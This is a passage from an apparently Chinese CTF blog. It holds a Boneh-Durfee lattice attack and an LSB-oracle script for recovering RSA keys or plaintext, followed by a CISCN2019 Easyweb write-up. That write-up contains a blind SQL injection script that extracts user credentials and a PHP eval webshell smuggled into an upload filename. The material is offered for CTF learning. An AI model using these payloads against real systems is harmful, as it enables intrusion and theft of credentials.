class="title">boneh_durfee</span><span class="params">(pol, modulus, mm, tt, XX, YY)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> range(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn<span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"failure"</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"We do not have det &lt; bound. Solutions might not be found."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Try with highers m and t."</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"size det(L) - size e^(m*n) = "</span>, floor(diff)</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"optimizing basis of the lattice via LLL, this can take a long time"</span></span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"LLL is done!"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"looking for independent vectors in the lattice"</span></span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> range(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> range(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"found them, using vectors"</span>, pol1_idx, <span class="string">"and"</span>, pol2_idx</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"no independant vectors could be found. This should very rarely happen..."</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Your prediction (delta) is too small"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.18</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = int((<span class="number">1</span><span class="number">-2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don't touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = int((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== checking values ==="</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* delta:"</span>, delta</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* delta &lt; 0.292"</span>, delta &lt; <span class="number">0.292</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* size of e:"</span>, int(log(e)/log(<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* size of N:"</span>, int(log(N)/log(<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* m:"</span>, m, <span class="string">", t:"</span>, t</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== running algorithm ==="</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== solution found ==="</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"x:"</span>, solx</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"y:"</span>, soly</span><br><span class="line"></span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"private key found:"</span>, d</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== no solution was found ==="</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== %s seconds ==="</span> % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure>

<h2 id="RSA-LSB-Oracle-Attack"><a href="#RSA-LSB-Oracle-Attack" class="headerlink" title="RSA LSB Oracle Attack"></a>RSA LSB Oracle Attack</h2><p>适用情况：可以选择密文并泄露最低位。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA加密中，明文为m，模数为n，加密指数为e，密文为c。我们可以构造出c'=((<span class="number">2</span>^e)*c)%n=((<span class="number">2</span>^e)*(m^e))%n=((<span class="number">2</span>*m)^e)%n， 因为m的两倍可能大于n，所以经过解密得到的明文是 m'=(<span class="number">2</span>*m)%n 。我们还能够知道 m' 的最低位lsb 是<span class="number">1</span>还是<span class="number">0</span>。 因为n是奇数，而<span class="number">2</span>*m是偶数，所以如果lsb 是<span class="number">0</span>，说明(<span class="number">2</span>*m)%n 是偶数，没有超过n，即m&lt;n/<span class="number">2.0</span>，反之则m&gt;n/<span class="number">2.0</span> 。</span><br><span class="line"></span><br><span class="line">举个例子就能明白<span class="number">2</span>%<span class="number">3</span>=<span class="number">2</span> 是偶数，而<span class="number">4</span>%<span class="number">3</span>=<span class="number">1</span> 是奇数。以此类推，构造密文c<span class="string">"=(4^e)*c)%n 使其解密后为m"</span>=(<span class="number">4</span>*m)%n ，判断m<span class="string">" 的奇偶性可以知道m 和 n/4 的大小关系。所以我们就有了一个二分算法，可以在对数时间内将m的范围逼近到一个足够狭窄的空间。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">更多信息可参考：RSA Least-Significant-Bit Oracle Attack 和 RSA least significant bit oracle attack 。</span></span><br></pre></td></tr></table></figure>

<p>exp:（待验证）</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">def brute_flag(encrypted_flag, n, e):</span><br><span class="line"></span><br><span class="line">    <span class="attr">flag_count</span> = <span class="attr">n_count</span> = <span class="number">1</span></span><br><span class="line">    <span class="attr">flag_lower_bound</span> = <span class="number">0</span></span><br><span class="line">    <span class="attr">flag_upper_bound</span> = n</span><br><span class="line">    <span class="attr">ciphertext</span> = encrypted_flag</span><br><span class="line">    <span class="attr">mult</span> = <span class="number">1</span></span><br><span class="line">    while flag_upper_bound &gt; flag_lower_bound + <span class="number">1</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">"input your option:"</span>)</span><br><span class="line">        sh.sendline(<span class="string">"D"</span>)</span><br><span class="line">        <span class="attr">ciphertext</span> = (ciphertext * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        flag_count *= <span class="number">2</span></span><br><span class="line">        <span class="attr">n_count</span> = n_count * <span class="number">2</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">"bit = %d"</span> % mult)</span><br><span class="line">        mult += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        sh.recvuntil(<span class="string">"Your encrypted message:"</span>)</span><br><span class="line">        sh.sendline(str(ciphertext))</span><br><span class="line"></span><br><span class="line">        <span class="attr">data=sh.recvline()[:-1]</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="attr">data=='The</span> plain of your decrypted message is even!'):</span><br><span class="line">            <span class="attr">flag_upper_bound</span> = n * n_count / flag_count</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="attr">flag_lower_bound</span> = n * n_count / flag_count</span><br><span class="line">            n_count += <span class="number">1</span></span><br><span class="line">	return flag_upper_bound</span><br><span class="line">def main():</span><br><span class="line">    <span class="attr">n</span> = <span class="number">120357855677795403326899325832599223460081551820351966764960386843755808156627131345464795713923271678835256422889567749230248389850643801263972231981347496433824450373318688699355320061986161918732508402417281836789242987168090513784426195519707785324458125521673657185406738054328228404365636320530340758959</span></span><br><span class="line">    <span class="attr">ct</span> = <span class="number">2201077887205099886799419505257984908140690335465327695978150425602737431754769971309809434546937184700758848191008699273369652758836177602723960420562062515168299835193154932988833308912059796574355781073624762083196012981428684386588839182461902362533633141657081892129830969230482783192049720588548332813</span></span><br><span class="line">    print(long_to_bytes(brute_flag(ct, n, <span class="number">65537</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h2 id="选择密文攻击"><a href="#选择密文攻击" class="headerlink" title="选择密文攻击"></a>选择密文攻击</h2><p>适用情况：可以构造任意密文并获得对应明文。</p>
<p>这个好理解，在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足gcd(x,n)==1 从而使x模n的逆存在，构造密文c’=c*(x^e^) 使解密后明文为m’=(m*x)%n，则m=m’*x^-1^(mod n) 。可参看模意义下的运算法则部分。(x^-1^=gmpy2.invert(x,n))</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/10/07/rsa套路笔记/" data-id="ck2g3l2lc0015lgv3ruasfy3c" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-遇见了一个人，犯了一个错" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/01/遇见了一个人，犯了一个错/" class="article-date">
  <time datetime="2019-10-01T01:42:35.000Z" itemprop="datePublished">2019-10-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/01/遇见了一个人，犯了一个错/">遇见了一个人，犯了一个错</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        Here's something encrypted, password is required to continue reading.
        
          <p class="article-more-link">
            <a href="/2019/10/01/遇见了一个人，犯了一个错/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/10/01/遇见了一个人，犯了一个错/" data-id="ck2g3l2j0000vlgv30l7qivjb" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/private/">private</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-CISCN2019Easyweb" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/27/CISCN2019Easyweb/" class="article-date">
  <time datetime="2019-09-27T07:00:00.000Z" itemprop="datePublished">2019-09-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/27/CISCN2019Easyweb/">CISCN2019Easyweb</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="CISCN2019Easyweb"><a href="#CISCN2019Easyweb" class="headerlink" title="CISCN2019Easyweb"></a>CISCN2019Easyweb</h3><p>robots.txt</p>
<p>fuzz发现image.php.bak源码泄露</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>看到源码，显然是要sql注入，然后这里只有对$id和$path进行了简单的替换为空，很好绕过。</p>
<p>这里可以使<code>id=\\0</code>，替换后只剩一个\，插入语句实现对引号的转义，从未破坏查询语句</p>
<p>然后在path处注入语句</p>
<p>似乎是采取了二分法的盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">database = <span class="string">"select database()"</span><span class="comment">#ciscnfinal</span></span><br><span class="line">table = <span class="string">"select group_concat(table_name) from information_schema.tables where table_schema=0x636973636e66696e616c"</span></span><br><span class="line">column = <span class="string">"select group_concat(column_name) from information_schema.columns where table_schema=0x636973636e66696e616c and table_name=0x7573657273"</span></span><br><span class="line">flag=<span class="string">"select group_concat(username,password) from users"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">r'http://7a00b976-969a-4082-bb2b-6edd24ae9b81.node2.buuoj.cn.wetolink.com:82/image.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">" or id=if(ascii(substr(("</span>+table+<span class="string">" limit 1 offset 0),%d,1))&gt;%d,1,0)#"</span> % (x, mid)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'\\0'</span>,</span><br><span class="line">            <span class="string">'path'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print (params)</span></span><br><span class="line">        response = requests.get(url, params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b'JFIF'</span> <span class="keyword">in</span> response.content:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>判断成功条件：若成功，语句则为id = True -&gt; id = 1，从而会返回一张猫片。</p>
<p>注入得到用户名，密码，</p>
<p>然后登录进入user.php，上传文件。上传后，文件名会记录进log目录下的一个php文件。于是改文件名为一句话木马，然后访问log目录下的这个文件即可。</p>
<p>由于这里存在对’php’字符的过滤，可以利用短标签绕过php。    </p>
<p>上传文件，抓包更改文件名：<code>&lt;?= @eval($_GET[&#39;v&#39;]);?&gt;.jpg</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/09/27/CISCN2019Easyweb/" data-id="ck2g3l2nq001elgv3w0w25wlm" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Write-Up/">Write Up</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-su-easyweb_shrine" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/25/su-easyweb_shrine/" class="article-date">
  <time datetime="2019-09-25T15:54:55.000Z" itemprop="datePublished">2019-09-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/25/su-easyweb_shrine/">su-easyweb_shrine</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="SUCTF-easy-web"><a href="#SUCTF-easy-web" class="headerlink" title="SUCTF-easy web"></a>SUCTF-easy web</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    